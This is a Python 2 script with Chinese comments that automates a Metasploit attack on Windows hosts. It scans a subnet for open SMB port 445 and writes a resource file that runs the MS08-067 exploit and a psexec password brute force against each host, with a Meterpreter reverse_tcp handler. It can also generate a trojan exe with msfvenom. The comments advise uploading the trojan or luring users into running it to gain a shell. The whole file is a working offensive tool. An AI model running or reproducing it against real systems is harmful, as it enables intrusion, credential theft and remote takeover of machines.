#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/13
# Created by 冰河
# Description 利用Metasploit实施攻击的脚本
#             用法： python metasploit_attack.py -H 192.168.175.130-150 -l 192.168.175.128 -p 4444 -U Administrator -F password.txt
#                   python metasploit_attack.py -H 192.168.175.130 -l 192.168.175.128
#             运行完脚本后，需要运行如下命令生成木马exe，同时，将木马上传到目标机运行：
#               msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.175.128 lport=4444 -f exe -o shell.exe
#             也可以传入参数-c 木马文件 自动生成exe木马文件, 将exe木马上传或诱导用户下载运行即可获取目标机器的shell权限
#               python metasploit_attack.py -H 192.168.175.130-150 -l 192.168.175.128 -p 4444 -U Administrator -F password.txt -c shell.exe
#               python metasploit_attack.py -H 192.168.175.130 -l 192.168.175.128 -c shell.exe
# 博客 https://blog.csdn.net/l1028386804

import nmap
import os
import optparse

#程序生成的临时文件
file_name = 'meta.rc'
#默认的lport
default_lport = '1337'

#输入的参数是一个要扫描的主机IP地址(段),返回所有开放TCP 445端口的主机
#通过过滤，只留下开放TCP 445端口的主机，同时把那些通常会阻塞我们的连接企图的主机也消除掉
#将所有开放445端口的主机放到一个数组中，并返回
def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    #遍历所有扫描的主机
    for host in nmScan.all_hosts():
        #判断主机是否开放了445端口
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts

#设置handler
def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


#配置exploit
def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z \n')


#爆破smb服务
def smbBrute(configFile, tgtHost, passwdFile, lhost, lport, username='Administrator'):
    pf = open(passwdFile, 'r')
    #遍历密码文件中的每一个密码
    for password in pf.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')

#生成木马文件
#msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.175.128 lport=4444 -f exe -o shell.exe
def createExeFile(lhost, lport, exeFile):
    if lport == None:
        lport = default_lport
    cmd = 'msfvenom -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f exe -o ' + exeFile
    os.system(cmd)

#主函数
def main():
    configFile = open(file_name, 'w')
    parser = optparse.OptionParser('[-] Usage%prog -H <RHOST[S]> -l <LHOST> [-p <LPORT> -U <Username> -F <Password File> -c <EXE File>]')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify the target address[es]')
    parser.add_option('-l', dest='lhost',type='string', help='specify the listen address')
    parser.add_option('-U', dest='username', type='string', help='specify username')
    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
    parser.add_option('-F', dest='passwdFile', type='string', help='password file for SMB brute force attempt')
    parser.add_option('-c', dest='exeFile', type='string', help='exe file')

    (options, args) = parser.parse_args()

    if (options.tgtHost == None) | (options.lhost == None):
        print parser.usage
        exit(0)

    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = default_lport
    passwdFile = options.passwdFile
    tgtHosts = findTgts(options.tgtHost)
    username = options.username
    exeFile = options.exeFile

    #exeFile不为空，则生成木马文件
    if exeFile != None:
        createExeFile(lhost, lport, exeFile)

    #设置handler
    setupHandler(configFile, lhost, lport)
    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile != None:
            if username != None:
                smbBrute(configFile, tgtHost, passwdFile, lhost, lport, username)
            else:
                smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
    #关闭文件
    configFile.close()
    #调用msfconsole -r 命令
    os.system('msfconsole -r ' + file_name)

if __name__ == '__main__':
    main()